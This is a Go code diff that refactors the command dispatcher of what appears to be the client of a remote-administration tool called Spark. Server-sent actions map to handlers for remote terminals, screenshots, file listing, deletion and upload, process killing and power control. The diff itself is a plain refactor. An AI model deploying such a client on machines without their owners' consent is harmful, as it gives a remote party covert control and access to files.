@@ -3,11 +3,6 @@ package core
 import (
 	"Spark/client/common"
 	"Spark/client/config"
-	"Spark/client/service/basic"
-	"Spark/client/service/file"
-	"Spark/client/service/process"
-	"Spark/client/service/screenshot"
-	"Spark/client/service/terminal"
 	"Spark/modules"
 	"Spark/utils"
 	"encoding/hex"
@@ -17,7 +12,6 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"strconv"
 	"time"
 
 	ws "github.com/gorilla/websocket"
@@ -32,6 +26,25 @@ var stop bool
 var (
 	errNoSecretHeader = errors.New(`can not find secret header`)
 )
+var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
+	`offline`:        offline,
+	`lock`:           lock,
+	`logoff`:         logoff,
+	`hibernate`:      hibernate,
+	`suspend`:        suspend,
+	`restart`:        restart,
+	`shutdown`:       shutdown,
+	`screenshot`:     screenshot,
+	`initTerminal`:   initTerminal,
+	`inputTerminal`:  inputTerminal,
+	`resizeTerminal`: resizeTerminal,
+	`killTerminal`:   killTerminal,
+	`listFiles`:      listFiles,
+	`removeFile`:     removeFile,
+	`uploadFile`:     uploadFile,
+	`listProcesses`:  listProcesses,
+	`killProcess`:    killProcess,
+}
 
 func Start() {
 	for !stop {
@@ -192,167 +205,10 @@ func handleWS(wsConn *common.Conn) error {
 }
 
 func handleAct(pack modules.Packet, wsConn *common.Conn) {
-	switch pack.Act {
-	case `offline`:
+	if act, ok := handlers[pack.Act]; !ok {
 		common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		stop = true
-		wsConn.Close()
-		os.Exit(0)
-		return
-	case `lock`:
-		err := basic.Lock()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `logoff`:
-		err := basic.Logoff()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `hibernate`:
-		err := basic.Hibernate()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `suspend`:
-		err := basic.Suspend()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `restart`:
-		err := basic.Restart()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `shutdown`:
-		err := basic.Shutdown()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `screenshot`:
-		if len(pack.Event) > 0 {
-			screenshot.GetScreenshot(pack.Event)
-		}
-	case `initTerminal`:
-		err := terminal.InitTerminal(pack)
-		if err != nil {
-			common.SendCb(modules.Packet{Act: `initTerminal`, Code: 1, Msg: err.Error()}, pack, wsConn)
-		}
-	case `inputTerminal`:
-		terminal.InputTerminal(pack)
-	case `resizeTerminal`:
-		terminal.ResizeTerminal(pack)
-	case `killTerminal`:
-		terminal.KillTerminal(pack)
-	case `listFiles`:
-		path := `/`
-		if val, ok := pack.Data[`path`]; ok {
-			if path, ok = val.(string); !ok {
-				path = `/`
-			}
-		}
-		files, err := file.ListFiles(path)
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0, Data: smap{`files`: files}}, pack, wsConn)
-		}
-	case `removeFile`:
-		val, ok := pack.Data[`path`]
-		if !ok {
-			common.SendCb(modules.Packet{Code: 1, Msg: `can not find such a file or directory`}, pack, wsConn)
-			return
-		}
-		path, ok := val.(string)
-		if !ok {
-			common.SendCb(modules.Packet{Code: 1, Msg: `can not find such a file or directory`}, pack, wsConn)
-			return
-		}
-		if path == `\` || path == `/` || len(path) == 0 {
-			common.SendCb(modules.Packet{Code: 1, Msg: `can not find such a file or directory`}, pack, wsConn)
-			return
-		}
-		err := os.RemoveAll(path)
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	case `uploadFile`:
-		var start, end int64
-		var path string
-		{
-			tempVal, ok := pack.Data[`file`]
-			if !ok {
-				common.SendCb(modules.Packet{Code: 1, Msg: `${i18n|unknownError}`}, pack, wsConn)
-				return
-			}
-			if path, ok = tempVal.(string); !ok {
-				common.SendCb(modules.Packet{Code: 1, Msg: `${i18n|unknownError}`}, pack, wsConn)
-				return
-			}
-			tempVal, ok = pack.Data[`start`]
-			if ok {
-				if v, ok := tempVal.(float64); ok {
-					start = int64(v)
-				}
-			}
-			tempVal, ok = pack.Data[`end`]
-			if ok {
-				if v, ok := tempVal.(float64); ok {
-					end = int64(v)
-					if end > 0 {
-						end++
-					}
-				}
-			}
-			if end > 0 && end < start {
-				common.SendCb(modules.Packet{Code: 1, Msg: `${i18n|invalidFileRange}`}, pack, wsConn)
-				return
-			}
-		}
-		err := file.UploadFile(path, pack.Event, start, end)
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		}
-	case `listProcesses`:
-		processes, err := process.ListProcesses()
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0, Data: map[string]interface{}{`processes`: processes}}, pack, wsConn)
-		}
-	case `killProcess`:
-		pidStr, ok := pack.Data[`pid`]
-		if !ok {
-			common.SendCb(modules.Packet{Code: 1, Msg: `${i18n|unknownError}`}, pack, wsConn)
-			return
-		}
-		pid, err := strconv.ParseInt(pidStr.(string), 10, 32)
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: `${i18n|unknownError}`}, pack, wsConn)
-			return
-		}
-		err = process.KillProcess(int32(pid))
-		if err != nil {
-			common.SendCb(modules.Packet{Code: 1, Msg: err.Error()}, pack, wsConn)
-		} else {
-			common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
-		}
-	default:
-		common.SendCb(modules.Packet{Code: 0}, pack, wsConn)
+	} else {
+		act(pack, wsConn)
 	}
 }
 
